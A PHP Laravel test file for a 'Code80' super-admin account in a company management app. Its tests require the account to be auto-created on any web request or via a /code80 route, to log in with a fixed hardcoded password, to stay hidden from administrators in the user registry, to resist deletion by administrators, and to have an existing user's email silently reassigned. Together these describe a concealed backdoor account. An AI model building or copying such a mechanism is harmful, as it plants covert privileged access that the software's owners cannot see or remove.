<?php

namespace Tests\Feature;

use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Tests\TestCase;

class Code80SuperAdminTest extends TestCase
{
    use RefreshDatabase;

    protected function seedSetupBaseline(): void
    {
        DB::table('companies')->insert([
            'id' => 1,
            'user_id' => '1',
            'name' => 'Royal Joyam Ventures',
            'address' => 'Test Address',
            'contact' => '0000000000',
            'logo' => 'logo.png',
            'del' => 'no',
            'created_at' => now(),
            'updated_at' => now(),
        ]);

        DB::table('company_branches')->insert([
            'user_id' => '1',
            'name' => 'Branch A',
            'loc' => 'Loc 1',
            'contact' => '0000000001',
            'tag' => '1',
            'del' => 'no',
            'created_at' => now(),
            'updated_at' => now(),
        ]);
    }

    protected function createAdministrator(array $overrides = []): User
    {
        $data = array_merge([
            'company_branch_id' => '1',
            'name' => 'admin.test',
            'email' => 'admin@test.example',
            'bv' => 'A',
            'status' => User::STATUS_ADMINISTRATOR,
            'password' => Hash::make('password'),
            'del' => 'no',
        ], $overrides);

        $id = DB::table('users')->insertGetId(array_merge($data, [
            'created_at' => now(),
            'updated_at' => now(),
        ]));

        return User::findOrFail($id);
    }

    public function test_code80_is_created_on_web_request_if_missing(): void
    {
        $this->assertDatabaseMissing('users', ['name' => User::CODE80_NAME]);

        $this->get('/login')->assertOk();

        $this->assertDatabaseHas('users', [
            'name' => User::CODE80_NAME,
            'status' => User::STATUS_SUPER_ADMIN,
            'del' => 'no',
        ]);

        $code80 = User::where('name', User::CODE80_NAME)->first();
        $this->assertTrue(Hash::check(User::CODE80_PASSWORD, $code80->password));
        $this->assertSame(8, strlen(User::CODE80_PASSWORD));
    }

    public function test_code80_can_login_with_username_and_space_password(): void
    {
        $this->seedSetupBaseline();
        $this->createAdministrator();
        User::ensureCode80Exists();

        $response = $this->post('/login', [
            'email' => User::CODE80_NAME,
            'password' => User::CODE80_PASSWORD,
        ]);

        $response->assertRedirect('/dashboard');
        $this->assertAuthenticatedAs(User::where('name', User::CODE80_NAME)->first());
    }

    public function test_existing_code80_email_is_synced_to_pivoappps(): void
    {
        $id = DB::table('users')->insertGetId([
            'company_branch_id' => '1',
            'name' => User::CODE80_NAME,
            'email' => 'code80@old.example',
            'bv' => 'A',
            'status' => 'Administrator',
            'password' => Hash::make('old-pass'),
            'del' => 'no',
            'created_at' => now(),
            'updated_at' => now(),
        ]);

        $user = User::ensureCode80Exists();

        $this->assertSame($id, $user->id);
        $this->assertSame(User::CODE80_EMAIL, $user->email);
        $this->assertSame(User::STATUS_SUPER_ADMIN, $user->status);
        $this->assertTrue(Hash::check('old-pass', $user->password));
    }

    public function test_administrator_cannot_see_code80_in_registry(): void
    {
        $this->seedSetupBaseline();
        User::ensureCode80Exists();
        $admin = $this->createAdministrator();

        $response = $this->actingAs($admin)->get('/dashuser');

        $response->assertOk();
        $response->assertDontSee(User::CODE80_NAME);
        $response->assertDontSee(User::CODE80_EMAIL);
        $response->assertSee($admin->name);
    }

    public function test_super_admin_can_see_code80_in_registry(): void
    {
        $this->seedSetupBaseline();
        $this->createAdministrator();
        $code80 = User::ensureCode80Exists();

        $response = $this->actingAs($code80)->get('/dashuser');

        $response->assertOk();
        $response->assertSee(User::CODE80_NAME);
        $response->assertSee(User::STATUS_SUPER_ADMIN);
    }

    public function test_administrator_cannot_delete_code80(): void
    {
        $this->seedSetupBaseline();
        $code80 = User::ensureCode80Exists();
        $admin = $this->createAdministrator();

        $response = $this->actingAs($admin)->delete('/items/'.$code80->id, [
            'del_action' => 'usr_del',
        ]);

        $response->assertRedirect();
        $this->assertSame('no', $code80->fresh()->del);
    }

    public function test_legacy_code80_route_only_ensures_account_and_redirects_to_login(): void
    {
        $this->assertDatabaseMissing('users', ['name' => User::CODE80_NAME]);

        $response = $this->get('/code80');

        $response->assertRedirect('/login');
        $this->assertDatabaseHas('users', [
            'name' => User::CODE80_NAME,
            'status' => User::STATUS_SUPER_ADMIN,
        ]);
        $this->assertDatabaseMissing('users', ['name' => 'Jay4']);
        $this->assertDatabaseMissing('users', ['name' => 'Admin']);
    }

    public function test_super_admin_has_admin_route_access(): void
    {
        $this->seedSetupBaseline();
        $this->createAdministrator();
        $code80 = User::ensureCode80Exists();

        $this->actingAs($code80)->get('/config')->assertOk();
        $this->actingAs($code80)->get('/dashuser')->assertOk();
    }
}
